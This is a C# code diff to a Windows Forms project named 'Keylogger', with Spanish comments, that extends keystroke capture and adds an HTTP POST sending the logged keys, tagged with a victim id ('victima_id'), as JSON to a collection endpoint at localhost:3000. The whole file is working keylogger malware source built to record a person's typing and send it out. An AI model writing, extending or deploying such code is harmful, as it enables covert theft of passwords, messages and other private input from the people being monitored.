@@ -10,9 +10,14 @@ using System.Windows.Forms;
 using System.Configuration;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Net.NetworkInformation;
+using System.Net.Http;
+using System.Net.Http.Headers;
+using Newtonsoft.Json;
 
 namespace Keylogger
 {
+   
     public partial class frmService : Form
     {
         #region DeclaracionVariables
@@ -39,11 +44,13 @@ namespace Keylogger
                 //cuando se cumpla el tiempo del timer ejecutar el evento Tempotizador
                 this.timer.Tick += new EventHandler(EventoTemporizador);
             }
-            catch(Exception ex) { 
-            
+            catch (Exception ex)
+            {
+
             }
-            
+
         }
+
         //evento para enviar las teclas ingresadas por el usuario a un archivo
         private void EventoTemporizador(object sender, EventArgs e)
         {
@@ -51,8 +58,9 @@ namespace Keylogger
             string buffer = "";
             //variable para guardar caracteres comunes
             string temp = "";
-
+            
             //iterar en un for buscar la tecla que se ingreso
+            
             foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
             {
                 //si se ingreso una  tecla
@@ -63,10 +71,12 @@ namespace Keylogger
                     //guardar en el temporal la tecla ingresada
                     temp = Enum.GetName(typeof(Keys), i);
 
+                    Console.WriteLine(temp);
 
+                  
 
                     // Switch para guardar los caracteres especialews
-                    switch (Enum.GetName(typeof(Keys), i))
+                    switch (temp)
                     {
                         //si es un espacio
                         case "Space":
@@ -81,27 +91,86 @@ namespace Keylogger
                             //Click Derecho
                             buffer += "[CI]";
                             break;
-
+                        case "D1":
+                            //Click Derecho
+                            buffer += "1";
+                            break;
+                        case "D2":
+                            //Click Derecho
+                            buffer += "2";
+                            break;
+                        case "D3":
+                            //Click Derecho
+                            buffer += "3";
+                            break;
+                        case "D4":
+                            //Click Derecho
+                            buffer += "4";
+                            break;
+                        case "D5":
+                            //Click Derecho
+                            buffer += "5";
+                            break;
+                        case "D6":
+                            //Click Derecho
+                            buffer += "6";
+                            break;
+                        case "D7":
+                            //Click Derecho
+                            buffer += "7";
+                            break;
+                        case "D8":
+                            //Click Derecho
+                            buffer += "8";
+                            break;
+                        case "D9":
+                            //Click Derecho
+                            buffer += "9";
+                            break;
+                        case "D0":
+                            buffer += "0";
+                            break;
+                        case "RButton":
+                            //Click Derecho
+                            buffer += "[CD]";
+                            break;
                         default:
                             buffer += Enum.GetName(typeof(Keys), i);
                             break;
                     }
-
-
-
-
                 }
 
             }
             //añadir el buffer al texto
             texto += buffer;
+
+            
             //si se ingreso mas de 10 caracteres
-            if (texto.Length > 10)
+            if (texto.Length > 30)
             {
                 //enviar el texto ingresado a la funcion de guardar texto
                 archivo(texto);
+
+                HttpClient client = new HttpClient();
+                var log = new logClass { victima_id = "1", log = texto };
+                string jsonString = JsonConvert.SerializeObject(log);
+                var stringContent = new StringContent(jsonString, Encoding.UTF8, "application/json");
+                client.BaseAddress = new Uri("http://localhost:3000/");
+                var response = client.PostAsync("api/userLog/postKeylogger", stringContent).Result;
+                if (response.IsSuccessStatusCode)
+                {
+                    Console.Write("Success");
+                }
+                else
+                {
+                    Console.Write("Error");
+                }
+
+
                 //colocar el texto como vacio para no enviar datos guardados
                 texto = "";
+
+
             }
 
 
@@ -138,5 +207,14 @@ namespace Keylogger
         {
 
         }
+    }
+    public class logClass
+    {
+        public string victima_id { get; set; }
+        public string log { get; set; }
+
+      
+
+
     }
 }
